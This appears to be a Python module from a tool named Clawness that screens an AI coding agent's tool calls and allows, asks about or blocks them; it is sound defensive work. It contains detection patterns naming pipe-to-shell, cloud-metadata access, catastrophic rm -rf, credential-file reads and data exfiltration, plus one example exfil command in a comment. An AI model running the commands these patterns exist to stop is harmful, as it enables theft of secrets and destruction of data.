"""
Access guard — in-session defense against the agent's own tool calls.

A companion to the plan gate (``plan.py``). Where the plan gate asks "has a plan
been approved?", the access guard asks "is *this specific tool call* a likely
exfiltration, destruction, or scope-escape?" and, when it is, forces a human
decision **even if the user has broadly allow-listed the tool** — defeating the
"click approve on everything" failure mode.

Decision values mirror Claude Code's PreToolUse contract:
  - ``allow`` : say nothing, defer to the normal permission flow (the hot path).
  - ``ask``   : force the native permission prompt (overrides the user allowlist).
  - ``deny``  : block the call outright.

Tiers (conservative on DENY — a false deny blocks real work; a false ask only
costs one extra prompt):

  DENY  pipe-to-shell (``curl … | sh``), cloud-metadata endpoints, reading a
        credential file *and* sending to the network in one command, catastrophic
        ``rm -rf`` targets, and ``git push --force`` (not --force-with-lease).
  ASK   writes resolving OUTSIDE the project root (+ temp/plan allowlist), reads
        of credential-shaped paths, and named package installs (lifecycle scripts).
  PROVENANCE-TIERED  data-bearing network calls (curl --data / -F / -T / -X POST,
        scp / rsync / sftp): extract the destination host and check whether it
        appears anywhere in the project's own source/config (the trusted corpus,
        which EXCLUDES ``.claude/`` skills/agents — a hijacked skill must not be
        able to launder a value into "trusted"). A destination found nowhere in
        the codebase is the exfil signature → DENY; a known or unverifiable
        destination → ASK.

Everything is pure logic and unit-testable; ``hooks/access_guard.py`` is the thin
stdin/stdout wrapper that wires this to the runtime and persists the anti-re-nag
ledger. The decision functions never raise on bad input — they fail toward
``allow`` so a guard bug can never break a session.
"""

from __future__ import annotations

import json
import os
import re
import tempfile
import time
from pathlib import Path
from typing import Optional

from .plan import clawness_dir, find_project_root, is_plan_file  # noqa: F401  (find_project_root re-exported for the hook)

WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}

ALLOW = "allow"
ASK = "ask"
DENY = "deny"

# --- provenance corpus bounds ---------------------------------------------
# The trusted corpus for the provenance check is the project working tree, MINUS
# these dirs. `.claude`/`.clawness` are excluded so a hijacked skill/agent can't
# launder an exfil host into "looks like a project resource"; the rest are heavy
# or vendored trees that only slow the scan. We read EVERY other text file (any
# filetype), so this is correct whether a project stores hosts in .env, a
# docker-compose.yml, appsettings.json, or hardcoded in source — no curated
# filetype list to keep in sync.
_PROVENANCE_SKIP_DIRS = {
    ".claude", ".clawness", ".git", "node_modules", ".venv", "venv", "env",
    "__pycache__", "dist", "build", ".next", "out", "target", "vendor",
    ".cache", "site-packages", ".mypy_cache", ".pytest_cache", ".tox",
    ".gradle", "Pods", ".idea", ".vscode", "coverage", ".turbo",
}
_PROV_MAX_FILES = 1500          # cap: undetermined (→ ask) past this, never hang
_PROV_MAX_FILE_BYTES = 524_288  # skip individual files larger than 512 KB
_PROV_MIN_VALUE_LEN = 4         # too-short values match noise; treat as unverifiable


# --- credential-shaped paths (reads to ASK on) ----------------------------
_SENSITIVE_READ_RE = re.compile(
    r"""(?ix)
    (^|[\\/])\.env(\.|$)                       # .env, .env.local, .env.production
    | (^|[\\/])\.ssh([\\/]|$)                  # ~/.ssh/...
    | (^|[\\/])\.aws([\\/]|$)                  # ~/.aws/credentials
    | (^|[\\/])\.gnupg([\\/]|$)
    | \.pem$ | \.key$ | \.ppk$
    | (^|[\\/])id_(rsa|dsa|ecdsa|ed25519)(\.|$)
    | (^|[\\/])\.npmrc$ | (^|[\\/])\.pypirc$ | (^|[\\/])\.netrc$
    | (^|[\\/])\.pgpass$ | (^|[\\/])\.git-credentials$
    | (^|[\\/])\.config[\\/]gh([\\/]|$)
    | (^|[\\/])\.docker[\\/]config\.json$
    | (^|[\\/])\.kube[\\/]config$
    | terraform\.tfstate
    | service[-_]?account[\w-]*\.json$
    """
)

# --- Bash command patterns ------------------------------------------------
_PIPE_TO_SHELL_RE = re.compile(
    r"(?is)\b(curl|wget|fetch|iwr|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*"
    r"(sudo\s+)?(sh|bash|zsh|dash|fish|python\d?|perl|ruby|node|iex|invoke-expression)\b"
)
_METADATA_RE = re.compile(
    r"169\.254\.169\.254|metadata\.google\.internal|metadata\.azure\.com|100\.100\.100\.200"
)
# Catastrophic recursive delete: an `rm` with a recursive (-r) flag whose target is
# the filesystem root, the home directory itself (incl. a top-level dot-dir like
# ~/.ssh), a system dir, or a drive root. Deeper home paths are NOT denied:
# `rm -rf $HOME/proj/node_modules` is routine build hygiene (a hard deny there is
# a fail-closed FP) — a *top-level* home dir gets the ASK tier below instead.
_HOME_PREFIX = r"(?:~|\$\{?HOME\}?|%USERPROFILE%|/home/[\w.-]+|/Users/[\w.-]+)"
_RM_CATASTROPHIC_RE = re.compile(
    rf"""(?ix)
    \brm\b (?=[^\n;|&]*\B-\w*r)        # an rm whose flags include r (recursive)
    [^\n;|&]*? \s ["']?
    ( /+ (?=\s|$|\*)                   # bare / (root)
    | /\*                              # /*
    | {_HOME_PREFIX} (?: [\\/]\*? | [\\/]\.[\w.-]+[\\/]? )? (?=\s|$|[;|&"'])
                                       # home root, home/* or a top-level dotdir (~/.ssh)
    | %SYSTEMROOT%
    | /(etc|usr|var|bin|sbin|lib|lib64|root|boot|sys|opt)(?=/|\s|$)
    | /home (?=/?\s|/?$)               # /home itself (per-user roots via the prefix)
    | /Users (?=/?\s|/?$)
    | [A-Za-z]:[\\/]+ (?=\s|$|\*)      # a drive root (C:\), not deeper Windows paths
    )
    """
)
# Recursive delete of a top-level home directory (`rm -rf ~/projects`) — plausibly
# intentional (clearing an old clone) but destructive enough to confirm. Deeper
# paths ($HOME/proj/node_modules) are routine and stay silent.
_RM_HOME_TOPDIR_RE = re.compile(
    rf"""(?ix)
    \brm\b (?=[^\n;|&]*\B-\w*r)
    [^\n;|&]*? \s ["']?
    {_HOME_PREFIX} [\\/] [\w.-]+ [\\/]? (?=\s|$|[;|&"'])
    """
)
_FORCE_PUSH_RE = re.compile(r"(?i)\bgit\s+push\b[^\n;]*?(--force\b(?!-with-lease)|\s-f\b)")
_NETWORK_RE = re.compile(
    r"(?i)\b(curl|wget|nc|netcat|telnet|scp|rsync|sftp|ftp|"
    r"invoke-webrequest|iwr|invoke-restmethod)\b"
)
_DATA_NETWORK_RE = re.compile(
    r"(?is)\b(curl|wget)\b.*?("
    r"-d\b|--data\b|--data-binary\b|--data-raw\b|--data-urlencode\b|"
    r"-F\b|--form\b|-T\b|--upload-file\b|--post-data\b|--post-file\b|"
    r"-X\s*(POST|PUT|PATCH)\b)"
)
_REMOTE_COPY_RE = re.compile(r"(?i)\b(scp|rsync|sftp)\b")
# File-shaped credential references (NOT the bare word "credentials" — that
# false-denied legit endpoints like `curl .../credentials/rotate`).
_CRED_REF_RE = re.compile(
    r"(?i)(\.env\b|[\\/]\.ssh[\\/]|[\\/]\.aws[\\/]|\bid_rsa\b|\bid_ed25519\b|\.pem\b|"
    r"\.npmrc\b|\.git-credentials\b|\.pgpass\b|\.aws[\\/]credentials|"
    r"AWS_SECRET\w*|SECRET_KEY|PRIVATE_KEY)"
)
# Secret locations that essentially never live inside a project — reading these
# (even with no network in the same command) is exfil recon, so ASK. The user's
# OWN project .env/config is deliberately excluded: that's normal dev work.
_HOME_SECRET_RE = re.compile(
    r"(?i)(~[\\/]\.(ssh|aws|gnupg)\b|[\\/]\.ssh[\\/]|[\\/]\.aws[\\/]|[\\/]\.gnupg[\\/]|"
    r"\bid_rsa\b|\bid_ed25519\b|\.git-credentials\b|\.pgpass\b|\.aws[\\/]credentials|"
    r"~[\\/]\.config[\\/]gh\b|[\\/]\.config[\\/]gh[\\/])"
)
# Commands that read a file's contents out (so a secret-location read is visible).
_BASH_READER_RE = re.compile(
    r"(?i)(?:^|[|&;]|\s)(cat|bat|tac|head|tail|less|more|strings|xxd|od|hexdump|"
    r"nl|type|get-content|gc)\b"
)
# Command substitution / inline capture — turns a GET into an exfil channel
# (`curl https://x/?d=$(cat secret)`), unlike a plain parameterised API call.
_CMD_SUBST_RE = re.compile(r"\$\(|\$\{[A-Za-z_]|`|<\(")
_PKG_INSTALL_RE = re.compile(
    r"(?i)\b("
    r"npm\s+(i|install|add)|pnpm\s+(i|install|add)|yarn\s+add|bun\s+(add|install)|"
    r"pip\s+install|pip3\s+install|uv\s+(add|pip\s+install)|poetry\s+add|"
    r"gem\s+install|cargo\s+(add|install)|go\s+install|"
    r"apt(-get)?\s+install|brew\s+install)\b"
)
# A named package as opposed to a lockfile restore (`npm install` / `pip install
# -r req.txt`). We only ASK when a concrete package name is being fetched.
_PKG_BARE_RE = re.compile(r"(?i)\b(npm|pnpm|yarn|bun)\s+(i|install)\s*(--?\w+\s*)*$")
# Manifest/editable restores install only what the project already declares, not a
# new named package, so they stay silent. Anchored to command end so a mixed form
# (`pip install -r req.txt evil-pkg`) still asks.
_PKG_RESTORE_RE = re.compile(
    r"(?i)\b(pip3?|uv\s+pip)\s+install\s+(--?[\w-]+(=\S+)?\s+)*"
    r"(-r\s+\S+|-e\s+\.|\.)\s*(--?[\w-]+(=\S+)?\s*)*$"
)

_URL_HOST_RE = re.compile(r"https?://([^/\s'\"`]+)")
# scp/ssh destination — REQUIRE the user@host: form so we don't mistake a URL
# scheme ("https:") for a host. Plain URLs are handled by _URL_HOST_RE.
_SCP_HOST_RE = re.compile(r"(?:^|[\s'\"])[A-Za-z0-9._-]+@([A-Za-z0-9.-]+):")


# --- reasons (shown to the user in the permission dialog) -----------------
def _deny(why: str) -> str:
    return (
        f"\U0001f6d1 BLOCKED BY CLAWNESS — {why}. This is a HARD block with no "
        "in-Claude override — retrying just re-triggers it. If you genuinely intend "
        "this, the user must run it themselves in a terminal, or set "
        "CLAW_NO_ACCESS_GUARD=1 for the session and re-issue. For the catastrophic / "
        "exfiltration cases this guards, the safe answer is usually not to."
    )


def _ask(why: str) -> str:
    return (
        f"⚠️  CLAWNESS — CONFIRM THIS IS INTENDED: {why}. Flagged even though "
        "the tool may be allow-listed; approve only if you expected this."
    )


# --- small path helpers ---------------------------------------------------
def _within(target: Path, base: "str | Path | None") -> bool:
    if base is None:
        return False
    try:
        target.resolve().relative_to(Path(base).resolve())
        return True
    except (ValueError, OSError):
        return False


def _is_external_host(host: str) -> bool:
    """True if *host* is a routable external destination (not localhost/private)."""
    h = (host or "").strip().lower().rstrip(".")
    if not h or h in ("localhost",) or h.endswith((".local", ".localhost", ".internal")):
        return False
    if h in ("::1", "0.0.0.0") or h.startswith(("127.", "10.", "192.168.", "169.254.")):
        return False
    if re.match(r"172\.(1[6-9]|2\d|3[01])\.", h):
        return False
    return True


def _external_hosts(cmd: str) -> list[str]:
    """Destination hosts referenced by a command (URL netlocs + scp/ssh hosts)."""
    hosts: list[str] = []
    for netloc in _URL_HOST_RE.findall(cmd):
        host = netloc.split("@")[-1].split(":")[0]  # strip userinfo + port
        hosts.append(host)
    hosts += _SCP_HOST_RE.findall(cmd)
    # de-dup, preserve order, keep only external
    seen: set[str] = set()
    out: list[str] = []
    for h in hosts:
        if h and h not in seen and _is_external_host(h):
            seen.add(h)
            out.append(h)
    return out


# --- provenance: is a literal present in the project's own files? ---------
def _file_contains(path: Path, needle: str) -> bool:
    try:
        if path.stat().st_size > _PROV_MAX_FILE_BYTES:
            return False
        return needle in path.read_text(encoding="utf-8", errors="ignore")
    except (OSError, ValueError):
        return False


def value_in_project(value: str, root: Path) -> Optional[bool]:
    """Search the project working tree (every text file, minus untrusted/heavy
    dirs) for the literal *value*.

    Returns True if found (endogenous — a known project resource), False if the
    scan completes without a match (exogenous — appears nowhere in the codebase),
    or None if undetermined (value too short to search reliably, or the scan hit
    its file-count cap). Callers treat None as "unverifiable → ask".
    """
    if not value or len(value) < _PROV_MIN_VALUE_LEN:
        return None
    try:
        root = Path(root).resolve()
    except OSError:
        return None
    if not root.is_dir():
        return None

    seen = 0
    frontier = [root]
    while frontier:
        current = frontier.pop()
        try:
            entries = list(current.iterdir())
        except (OSError, PermissionError):
            continue
        for entry in entries:
            try:
                if entry.is_symlink():
                    continue
                if entry.is_dir():
                    if entry.name not in _PROVENANCE_SKIP_DIRS:
                        frontier.append(entry)
                    continue
                if not entry.is_file():
                    continue
            except OSError:
                continue
            seen += 1
            if seen > _PROV_MAX_FILES:
                return None  # cap hit → unverifiable, let the user decide
            if _file_contains(entry, value):
                return True
    return False


# --- the guard's own kill switches (never silently writable) --------------
# Editing these can disable the guard / plan gate or bless a tampered ledger, so
# they ASK even though they live inside the project. NOTE: project memory
# (.clawness/memory.md) and the rule corpus are deliberately NOT here — those are
# meant to be edited freely and gating them would just nag.
_CLAUDE_CONTROL_JSON = {"settings.json", "settings.local.json"}
_CLAWNESS_CONTROL_JSON = {
    "config.json", "trust_ledger.json", "guard_sessions.json", "sessions.json", "plan.json",
}
_GUARD_HOOK_FILES = {
    "access_guard.py", "plan_gate.py", "trust_ledger.py", "claude_hook.py", "git_check.py",
    "memory_init.py", "stack_detect.py", "compress_output.py", "ensure_deps.py",
}


def _is_control_file(p: Path) -> bool:
    parts = set(p.parts)
    name = p.name
    if name in _CLAUDE_CONTROL_JSON and ".claude" in parts:
        return True
    if name in _CLAWNESS_CONTROL_JSON and ".clawness" in parts:
        return True
    if name in _GUARD_HOOK_FILES and p.parent.name == "hooks":
        return True
    return False


# --- tier classifiers -----------------------------------------------------
def _classify_write(tool_input: dict, root: Path, allow_paths) -> tuple[str, str]:
    target = tool_input.get("file_path") or tool_input.get("notebook_path")
    if not target:
        return (ALLOW, "")
    try:
        p = Path(target).resolve()
    except OSError:
        return (ALLOW, "")  # can't resolve → don't block
    # A security-control file is gated even when it's inside the project — a kill
    # switch shouldn't be flippable with a silent in-project write.
    if _is_control_file(p):
        return (ASK, _ask(
            f"editing a security-control file ({p.name}) that can disable Clawness's own "
            "protections or its tamper log"))
    if is_plan_file(p) or _within(p, root) or _within(p, tempfile.gettempdir()):
        return (ALLOW, "")
    for a in (allow_paths or []):
        if _within(p, a):
            return (ALLOW, "")
    return (ASK, _ask(f"writing to a file OUTSIDE the project ({p})"))


def _classify_read(tool_input: dict, root: Path) -> tuple[str, str]:
    target = tool_input.get("file_path") or ""
    if not target:
        return (ALLOW, "")
    s = str(target)
    # Credential stores outside any project (~/.ssh, ~/.aws, …) → always ask.
    if _HOME_SECRET_RE.search(s):
        return (ASK, _ask(f"reading a credential store outside the project ({target})"))
    # Other credential-shaped files: prompt only when OUTSIDE the project. Reading
    # your OWN project's .env / keys is normal dev work and must stay frictionless.
    if _SENSITIVE_READ_RE.search(s):
        try:
            p = Path(s).resolve()
        except OSError:
            p = None
        if p is None or not _within(p, root):
            return (ASK, _ask(f"reading a credential-shaped file outside the project ({target})"))
    return (ALLOW, "")


def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
    cmd = str(tool_input.get("command") or "")
    if not cmd.strip():
        return (ALLOW, "")

    # --- hard denies: ~zero legitimate dev use, or the exfil signature ---
    # (deny has NO in-Claude override on the VS Code build — keep this set to
    # things a user would essentially never want pushed through by a sleepy "yes".)
    if _METADATA_RE.search(cmd):
        return (DENY, _deny("it contacts a cloud instance-metadata endpoint (credential theft vector)"))
    if _RM_CATASTROPHIC_RE.search(cmd):
        return (DENY, _deny("it recursively deletes a filesystem root, home, or system directory"))
    if _NETWORK_RE.search(cmd) and _CRED_REF_RE.search(cmd):
        return (DENY, _deny("it references a credential/secret file in a command that also touches the network"))

    # --- dual-use: dangerous but routinely legitimate → ask (approvable) ---
    # Pipe-to-shell is how most official installers run (curl … | sh); a force-push
    # is normal on rebased branches. A hard deny would just train users to disable
    # the guard, so surface an approve prompt instead.
    if _RM_HOME_TOPDIR_RE.search(cmd):
        return (ASK, _ask("recursively deleting an entire top-level directory in the home folder"))
    if _PIPE_TO_SHELL_RE.search(cmd):
        return (ASK, _ask("running a script piped straight from the network into a shell — fine for a trusted installer, risky otherwise"))
    if _FORCE_PUSH_RE.search(cmd):
        return (ASK, _ask("a force-push that rewrites remote history — prefer --force-with-lease"))

    # Reading a credential store OUTSIDE the project (e.g. cat ~/.ssh/id_rsa) — the
    # Read-tool gate is bypassable via Bash, so cover it here. In-project secret
    # reads are intentionally not gated (normal dev work).
    if _BASH_READER_RE.search(cmd) and _HOME_SECRET_RE.search(cmd):
        return (ASK, _ask("reading a credential store outside the project (e.g. ~/.ssh, ~/.aws)"))

    # --- provenance-tiered network egress ---
    # Flag a call only when it has an EXTERNAL destination AND either carries a
    # body/upload or embeds shell substitution (the exfil shapes). A plain
    # parameterised GET to an external API has neither, so it stays allowed.
    ext_hosts = _external_hosts(cmd)
    data_bearing = bool(_DATA_NETWORK_RE.search(cmd) or _REMOTE_COPY_RE.search(cmd))
    has_subst = bool(_NETWORK_RE.search(cmd) and _CMD_SUBST_RE.search(cmd))
    if ext_hosts and (data_bearing or has_subst):
        verdicts = [value_in_project(h, root) for h in ext_hosts]
        if False in verdicts:
            unknown = ", ".join(h for h, v in zip(ext_hosts, verdicts) if v is False)
            # Absent-host + data-bearing is suspicious either way, but only a hard
            # DENY when a secret/credential signal is also in the command — plain
            # data upload to a host given inline (CLI arg, chat) rather than
            # written into a file is legitimate and shouldn't be unoverridable.
            secret_signal = bool(_CRED_REF_RE.search(cmd) or _CMD_SUBST_RE.search(cmd))
            if data_bearing and secret_signal:
                return (DENY, _deny(
                    f"it sends data to a host that appears nowhere in this codebase ({unknown}) — "
                    "the signature of data exfiltration"))
            if data_bearing:
                return (ASK, _ask(
                    f"uploading data to a host that appears nowhere in this codebase ({unknown})"))
            return (ASK, _ask(
                f"a network call to an unrecognized host ({unknown}) with shell substitution embedded"))
        return (ASK, _ask(f"a network upload to {', '.join(ext_hosts)} (a known/unverified destination)"))

    # --- package install (lifecycle scripts run arbitrary code) ---
    if (_PKG_INSTALL_RE.search(cmd)
            and not _PKG_BARE_RE.search(cmd)
            and not _PKG_RESTORE_RE.search(cmd)):
        return (ASK, _ask("installing a package — its lifecycle scripts run arbitrary code; verify the name/source"))

    return (ALLOW, "")


def classify_tool_call(
    tool_name: str,
    tool_input: "dict | None",
    root: Path,
    allow_paths=None,
) -> tuple[str, str]:
    """Classify a single tool call → (decision, reason).

    decision is one of ``allow`` / ``ask`` / ``deny``; reason is "" for allow.
    Never raises on malformed input — unknown shapes fall through to allow.
    """
    tool_input = tool_input or {}
    if tool_name in WRITE_TOOLS:
        return _classify_write(tool_input, root, allow_paths)
    if tool_name == "Read":
        return _classify_read(tool_input, root)
    if tool_name == "Bash":
        return _classify_bash(tool_input, root)
    return (ALLOW, "")


def dedup_key(tool_name: str, tool_input: "dict | None") -> str:
    """A stable key identifying *what* a flagged call targets, so the hook can
    avoid re-prompting for the identical target within one session."""
    tool_input = tool_input or {}
    if tool_name in WRITE_TOOLS:
        return str(tool_input.get("file_path") or tool_input.get("notebook_path") or "")
    if tool_name == "Read":
        return str(tool_input.get("file_path") or "")
    if tool_name == "Bash":
        return str(tool_input.get("command") or "")
    return ""


# --- anti-re-nag ledger (per session; mirrors plan.py sessions) -----------
_GUARD_TTL_SECONDS = 24 * 3600


def _guard_ledger_path(root: Path) -> Path:
    return clawness_dir(root) / "guard_sessions.json"


def _load_ledger(root: Path) -> dict:
    try:
        data = json.loads(_guard_ledger_path(root).read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else {}
    except (OSError, ValueError):
        return {}


def _save_ledger(root: Path, ledger: dict) -> None:
    d = clawness_dir(root)
    try:
        d.mkdir(parents=True, exist_ok=True)
        _guard_ledger_path(root).write_text(json.dumps(ledger, indent=2) + "\n", encoding="utf-8")
    except OSError:
        pass


def already_asked(root: Path, session_id: str, key: str) -> bool:
    """True if this (session, target) was already prompted — used to ASK once per
    target per session rather than on every repeat call."""
    if not session_id or not key:
        return False
    entry = _load_ledger(root).get(session_id)
    if not isinstance(entry, dict):
        return False
    ts = entry.get(key)
    return isinstance(ts, (int, float)) and (time.time() - ts) < _GUARD_TTL_SECONDS


def record_ask(root: Path, session_id: str, key: str) -> None:
    if not session_id or not key:
        return
    now = time.time()
    ledger = _load_ledger(root)
    # prune stale sessions to keep the file small
    pruned = {
        sid: {k: t for k, t in entry.items()
              if isinstance(t, (int, float)) and now - t < _GUARD_TTL_SECONDS}
        for sid, entry in ledger.items()
        if isinstance(entry, dict)
    }
    pruned = {sid: e for sid, e in pruned.items() if e}
    pruned.setdefault(session_id, {})[key] = now
    _save_ledger(root, pruned)
